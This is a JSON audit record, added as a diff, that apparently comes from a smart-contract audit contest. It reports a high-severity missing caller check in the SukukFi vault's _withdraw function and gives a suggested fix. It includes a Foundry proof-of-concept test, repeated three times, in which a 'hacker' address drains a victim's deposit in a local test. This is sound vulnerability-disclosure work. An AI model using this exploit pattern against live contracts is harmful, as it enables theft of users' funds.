@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "9ZcjDfx5VLP",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "9ZcjDfx5VLP",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_9ZcjDfx5VLP.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "9ZcjDfx5VLP",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Missing caller verification in `_withdraw` allows theft of assets",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "osok",
+  "body": "## Finding description\nThe `_withdraw()` function handles the destruction of shares and transfer of underlying assets. This function contains a critical access control omission.\nThe line `_shareToken.spendSelfAllowance(owner, shares)` correctly verifies that the owner has the necessary withdrawal limit (i.e., `allowance[owner][owner]`) approved by the Validator. However, the function fails to verify the identity of the `msg.sender`. It neither requires `msg.sender == owner`, nor does it check if `msg.sender` has a valid ERC-20 allowance to spend the owner's shares.\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ... \n    _shareToken.spendSelfAllowance(owner, shares); // Only checks owner's self-allowance, ignores msg.sender permissions\n    _shareToken.burn(owner, shares); // Burns owner's shares\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets); // Sends assets to receiver (can be anyone)\n```\nThis means that as long as an `owner` account has `Self-Allowance`, anyone can call the `withdraw()` or `redeem()`, specify themselves as the `receiver`, and transfer the `owner`'s funds.\n\n## Impact\nThe existence of this vulnerability places any user who obtains withdrawal permission at immediate risk of theft.\n\nDirect Fund Loss: Once a user obtains the Validator-approved Self-Allowance, any attacker can front-run the user's withdrawal transaction by monitoring the mempool and calling `withdraw()` first. The attacker does not need private keys or special privileges to burn the victim's shares and transfer the underlying assets to themselves.\n\n## Recommended mitigation steps\nEnforce caller verification in the `_withdraw()` function. If the caller is not the `owner`, the contract must check and consume the caller's standard ERC-20 allowance for the owner's assets.\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ... (existing checks)\n+       if (msg.sender != owner) {\n+           _shareToken.spendAllowance(owner, msg.sender, shares);\n+       }\n\n        _shareToken.spendSelfAllowance(owner, shares);\n```",
+  "proof_of_concept": "In the following PoC, the victim obtains a legitimate Validator approval, but an unrelated third-party hacker successfully calls withdraw to steal the funds.\n- Copy the test contract below into the `test/` folder and run `forge test --mt test_AnyoneCanSteal -vv`\n```solidity\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract CriticalTheftPoC is Test {\n    WERC7575ShareToken shareToken;\n    WERC7575Vault vault;\n    ERC20Faucet usdt;\n\n    address validator;\n    uint256 validatorPk;\n    address victim = makeAddr(\"victim\");\n    address hacker = makeAddr(\"hacker\");\n\n    bytes32 constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        usdt = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000 ether);\n        shareToken = new WERC7575ShareToken(\"RWA Share\", \"rShare\");\n        vault = new WERC7575Vault(address(usdt), shareToken);\n\n        shareToken.registerVault(address(usdt), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n\n        vm.prank(validator);\n        shareToken.setKycVerified(victim, true);\n\n        // Victim deposits 1000 USDT\n        usdt.transfer(victim, 1000 ether);\n        vm.startPrank(victim);\n        usdt.approve(address(vault), 1000 ether);\n        vault.deposit(1000 ether, victim);\n        vm.stopPrank();\n    }\n\n    function test_AnyoneCanSteal() public {\n        uint256 amount = 1000 ether;\n\n        // === Step 1: Victim receives Validator approval (simulating a normal withdrawal process) ===\n        // Construct the Validator's Permit signature for the Victim\n        uint256 deadline = block.timestamp + 1 hours;\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, keccak256(abi.encodePacked(\n            \"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(),\n            keccak256(abi.encode(PERMIT_TYPEHASH, victim, victim, amount, shareToken.nonces(victim), deadline))\n        )));\n        \n        // Victim submits Permit and obtains Self-Allowance\n        vm.prank(victim);\n        shareToken.permit(victim, victim, amount, deadline, v, r, s);\n        console.log(\"Before Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"Before Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n\n        // === Step 2: Hacker launches a permissionless attack ===\n        // Hacker detects that Victim has allowance and frontruns by calling withdraw directly\n        vm.startPrank(hacker); \n        vault.withdraw(amount, hacker, victim);\n        vm.stopPrank();\n\n        // === Verification ===\n        console.log(\"After Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"After Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n        assertEq(shareToken.balanceOf(victim), 0, \"Victim drained\");\n        assertEq(usdt.balanceOf(hacker), amount, \"Hacker got funds\");\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575Vault.sol#L397"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "572",
+    "api_submission_id": "",
+    "uid": "9ZcjDfx5VLP",
+    "number": "572",
+    "title": "Missing caller verification in `_withdraw` allows theft of assets",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "osok",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575Vault.sol#L397"
+    ],
+    "body": "## Finding description\nThe `_withdraw()` function handles the destruction of shares and transfer of underlying assets. This function contains a critical access control omission.\nThe line `_shareToken.spendSelfAllowance(owner, shares)` correctly verifies that the owner has the necessary withdrawal limit (i.e., `allowance[owner][owner]`) approved by the Validator. However, the function fails to verify the identity of the `msg.sender`. It neither requires `msg.sender == owner`, nor does it check if `msg.sender` has a valid ERC-20 allowance to spend the owner's shares.\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ... \n    _shareToken.spendSelfAllowance(owner, shares); // Only checks owner's self-allowance, ignores msg.sender permissions\n    _shareToken.burn(owner, shares); // Burns owner's shares\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets); // Sends assets to receiver (can be anyone)\n```\nThis means that as long as an `owner` account has `Self-Allowance`, anyone can call the `withdraw()` or `redeem()`, specify themselves as the `receiver`, and transfer the `owner`'s funds.\n\n## Impact\nThe existence of this vulnerability places any user who obtains withdrawal permission at immediate risk of theft.\n\nDirect Fund Loss: Once a user obtains the Validator-approved Self-Allowance, any attacker can front-run the user's withdrawal transaction by monitoring the mempool and calling `withdraw()` first. The attacker does not need private keys or special privileges to burn the victim's shares and transfer the underlying assets to themselves.\n\n## Recommended mitigation steps\nEnforce caller verification in the `_withdraw()` function. If the caller is not the `owner`, the contract must check and consume the caller's standard ERC-20 allowance for the owner's assets.\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ... (existing checks)\n+       if (msg.sender != owner) {\n+           _shareToken.spendAllowance(owner, msg.sender, shares);\n+       }\n\n        _shareToken.spendSelfAllowance(owner, shares);\n```",
+    "proof_of_concept": "In the following PoC, the victim obtains a legitimate Validator approval, but an unrelated third-party hacker successfully calls withdraw to steal the funds.\n- Copy the test contract below into the `test/` folder and run `forge test --mt test_AnyoneCanSteal -vv`\n```solidity\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract CriticalTheftPoC is Test {\n    WERC7575ShareToken shareToken;\n    WERC7575Vault vault;\n    ERC20Faucet usdt;\n\n    address validator;\n    uint256 validatorPk;\n    address victim = makeAddr(\"victim\");\n    address hacker = makeAddr(\"hacker\");\n\n    bytes32 constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        usdt = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000 ether);\n        shareToken = new WERC7575ShareToken(\"RWA Share\", \"rShare\");\n        vault = new WERC7575Vault(address(usdt), shareToken);\n\n        shareToken.registerVault(address(usdt), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n\n        vm.prank(validator);\n        shareToken.setKycVerified(victim, true);\n\n        // Victim deposits 1000 USDT\n        usdt.transfer(victim, 1000 ether);\n        vm.startPrank(victim);\n        usdt.approve(address(vault), 1000 ether);\n        vault.deposit(1000 ether, victim);\n        vm.stopPrank();\n    }\n\n    function test_AnyoneCanSteal() public {\n        uint256 amount = 1000 ether;\n\n        // === Step 1: Victim receives Validator approval (simulating a normal withdrawal process) ===\n        // Construct the Validator's Permit signature for the Victim\n        uint256 deadline = block.timestamp + 1 hours;\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, keccak256(abi.encodePacked(\n            \"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(),\n            keccak256(abi.encode(PERMIT_TYPEHASH, victim, victim, amount, shareToken.nonces(victim), deadline))\n        )));\n        \n        // Victim submits Permit and obtains Self-Allowance\n        vm.prank(victim);\n        shareToken.permit(victim, victim, amount, deadline, v, r, s);\n        console.log(\"Before Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"Before Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n\n        // === Step 2: Hacker launches a permissionless attack ===\n        // Hacker detects that Victim has allowance and frontruns by calling withdraw directly\n        vm.startPrank(hacker); \n        vault.withdraw(amount, hacker, victim);\n        vm.stopPrank();\n\n        // === Verification ===\n        console.log(\"After Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"After Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n        assertEq(shareToken.balanceOf(victim), 0, \"Victim drained\");\n        assertEq(usdt.balanceOf(hacker), amount, \"Hacker got funds\");\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/572",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-04T08:24:33.255Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "K6pF4JuqJnd",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:13:01.669Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "9ZcjDfx5VLP",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Missing caller verification in `_withdraw` allows theft of assets",
+      "uid": "9ZcjDfx5VLP",
+      "updatedAt": "2025-12-04T08:24:33.255Z",
+      "user": {
+        "uid": "8JuHhohZBXL",
+        "handle": "osok"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description\nThe `_withdraw()` function handles the destruction of shares and transfer of underlying assets. This function contains a critical access control omission.\nThe line `_shareToken.spendSelfAllowance(owner, shares)` correctly verifies that the owner has the necessary withdrawal limit (i.e., `allowance[owner][owner]`) approved by the Validator. However, the function fails to verify the identity of the `msg.sender`. It neither requires `msg.sender == owner`, nor does it check if `msg.sender` has a valid ERC-20 allowance to spend the owner's shares.\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ... \n    _shareToken.spendSelfAllowance(owner, shares); // Only checks owner's self-allowance, ignores msg.sender permissions\n    _shareToken.burn(owner, shares); // Burns owner's shares\n    SafeTokenTransfers.safeTransfer(_asset, receiver, assets); // Sends assets to receiver (can be anyone)\n```\nThis means that as long as an `owner` account has `Self-Allowance`, anyone can call the `withdraw()` or `redeem()`, specify themselves as the `receiver`, and transfer the `owner`'s funds.\n\n## Impact\nThe existence of this vulnerability places any user who obtains withdrawal permission at immediate risk of theft.\n\nDirect Fund Loss: Once a user obtains the Validator-approved Self-Allowance, any attacker can front-run the user's withdrawal transaction by monitoring the mempool and calling `withdraw()` first. The attacker does not need private keys or special privileges to burn the victim's shares and transfer the underlying assets to themselves.\n\n## Recommended mitigation steps\nEnforce caller verification in the `_withdraw()` function. If the caller is not the `owner`, the contract must check and consume the caller's standard ERC-20 allowance for the owner's assets.\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ... (existing checks)\n+       if (msg.sender != owner) {\n+           _shareToken.spendAllowance(owner, msg.sender, shares);\n+       }\n\n        _shareToken.spendSelfAllowance(owner, shares);\n```",
+      "proofOfConcept": "In the following PoC, the victim obtains a legitimate Validator approval, but an unrelated third-party hacker successfully calls withdraw to steal the funds.\n- Copy the test contract below into the `test/` folder and run `forge test --mt test_AnyoneCanSteal -vv`\n```solidity\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract CriticalTheftPoC is Test {\n    WERC7575ShareToken shareToken;\n    WERC7575Vault vault;\n    ERC20Faucet usdt;\n\n    address validator;\n    uint256 validatorPk;\n    address victim = makeAddr(\"victim\");\n    address hacker = makeAddr(\"hacker\");\n\n    bytes32 constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        usdt = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000 ether);\n        shareToken = new WERC7575ShareToken(\"RWA Share\", \"rShare\");\n        vault = new WERC7575Vault(address(usdt), shareToken);\n\n        shareToken.registerVault(address(usdt), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n\n        vm.prank(validator);\n        shareToken.setKycVerified(victim, true);\n\n        // Victim deposits 1000 USDT\n        usdt.transfer(victim, 1000 ether);\n        vm.startPrank(victim);\n        usdt.approve(address(vault), 1000 ether);\n        vault.deposit(1000 ether, victim);\n        vm.stopPrank();\n    }\n\n    function test_AnyoneCanSteal() public {\n        uint256 amount = 1000 ether;\n\n        // === Step 1: Victim receives Validator approval (simulating a normal withdrawal process) ===\n        // Construct the Validator's Permit signature for the Victim\n        uint256 deadline = block.timestamp + 1 hours;\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, keccak256(abi.encodePacked(\n            \"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(),\n            keccak256(abi.encode(PERMIT_TYPEHASH, victim, victim, amount, shareToken.nonces(victim), deadline))\n        )));\n        \n        // Victim submits Permit and obtains Self-Allowance\n        vm.prank(victim);\n        shareToken.permit(victim, victim, amount, deadline, v, r, s);\n        console.log(\"Before Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"Before Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n\n        // === Step 2: Hacker launches a permissionless attack ===\n        // Hacker detects that Victim has allowance and frontruns by calling withdraw directly\n        vm.startPrank(hacker); \n        vault.withdraw(amount, hacker, victim);\n        vm.stopPrank();\n\n        // === Verification ===\n        console.log(\"After Attack Victim Share Balance: \", shareToken.balanceOf(victim));\n        console.log(\"After Attack Hacker USDT Balance:  \", usdt.balanceOf(hacker));\n        assertEq(shareToken.balanceOf(victim), 0, \"Victim drained\");\n        assertEq(usdt.balanceOf(hacker), amount, \"Hacker got funds\");\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/18fe2578cf1c6203dac7ff21513533010f3dda3e/src/WERC7575Vault.sol#L397",
+      "number": 572,
+      "aiExplanation": null,
+      "_index": 572
+    }
+  }
+}
